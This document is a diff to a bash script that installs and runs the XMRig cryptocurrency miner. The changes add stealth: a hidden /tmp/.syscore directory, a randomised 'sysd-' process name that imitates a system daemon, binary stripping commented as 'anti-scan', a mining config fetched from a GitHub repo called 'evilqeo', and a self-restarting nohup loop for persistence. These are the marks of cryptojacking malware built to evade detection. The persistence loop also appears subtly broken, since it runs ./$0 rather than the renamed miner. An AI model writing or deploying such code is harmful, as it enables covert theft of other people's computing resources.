@@ -1,46 +1,76 @@
 #!/bin/bash
+set -euo pipefail
 
-xmrver="6.22.2"
+XMRIG_VERSION="6.22.2"
+WORK_DIR="/tmp/.syscore"
+FAKE_NAME="sysd-$(tr -dc a-z0-9 </dev/urandom | head -c 5)"
+ARCHIVE="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
+CONFIG_URL="https://raw.githubusercontent.com/evilqeo/frcx/main/config.json"
+MATCH_KEY="--donate-level"
 
-if [ -d /tmp ]; then
-    echo "/tmp exists"
-else
-    # create tmp if it doesn't exist (yes that happened...)
-    sudo -n mkdir /tmp
-    sudo -n chmod 777 /tmp
+# 1. Check if it's already running
+if pgrep -f "$MATCH_KEY" > /dev/null; then
+    echo "[✔] Already running."
+    exit 0
 fi
 
-# remove any aliases
-unalias -a
+echo "[!] Not running. Setting up..."
 
-# try to install wget and util-linux
-sudo -n apt update
-sudo -n apt install -y wget util-linux
-sudo -n apk add wget util-linux
-sudo -n dnf install wget util-linux
+# 2. Install dependencies
+install_deps() {
+    if command -v apt &>/dev/null; then
+        sudo apt update && sudo apt install -y wget tar util-linux
+    elif command -v apk &>/dev/null; then
+        sudo apk add wget tar util-linux
+    elif command -v dnf &>/dev/null; then
+        sudo dnf install -y wget tar util-linux
+    else
+        echo "[!] Unsupported package manager."
+        exit 1
+    fi
+}
+install_deps
 
+# 3. Set downloader
 if command -v wget >/dev/null 2>&1; then
-    DOWNLOAD_CMD="wget"
+    DL="wget -q"
 else
-    DOWNLOAD_CMD="curl -OL"
+    DL="curl -sO"
 fi
 
-mkdir -p /tmp/xmrig
-# run the script in /tmp/xmrig, after the script checks if it exists or not
-cd /tmp/xmrig
+# 4. Create working directory
+mkdir -p "$WORK_DIR"
+cd "$WORK_DIR"
 
-# use curl because it's present on more distributions
-$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
-tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
-cd xmrig-$xmrver
+# 5. Download and extract
+$DL "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${ARCHIVE}"
+tar -xf "${ARCHIVE}"
 
-# just to be extra safe
-chmod +x xmrig
+cd "xmrig-${XMRIG_VERSION}"
+mv xmrig "$FAKE_NAME"
+chmod +x "$FAKE_NAME"
 
-rm -f config.json
-$DOWNLOAD_CMD https://raw.githubusercontent.com/evilqeo/frcx/main/config.json
-randnum=$(( RANDOM % 1000 + 1 ))
-sed -i "s/kasm/kasm-$randnum/g" config.json
+# Optional: Strip binary metadata (anti-scan)
+strip "$FAKE_NAME" || true
 
-sudo -n ./xmrig
-./xmrig
+# 6. Download and randomize config
+$DL "$CONFIG_URL" -O config.json
+RAND_ID=$(( RANDOM % 10000 + 1 ))
+sed -i "s/kasm/kasm-$RAND_ID/g" config.json
+
+# 7. Brutally persistent loop
+cat > run.sh <<EOF
+#!/bin/bash
+cd "$(pwd)"
+while true; do
+    nohup ionice -c2 -n7 nice -n10 ./\$0 --config=config.json >/dev/null 2>&1
+    sleep 5
+done
+EOF
+
+chmod +x run.sh
+
+# 8. Run miner persistently
+nohup ./run.sh &
+
+echo "[✔] XMRig running persistently as '$FAKE_NAME'."
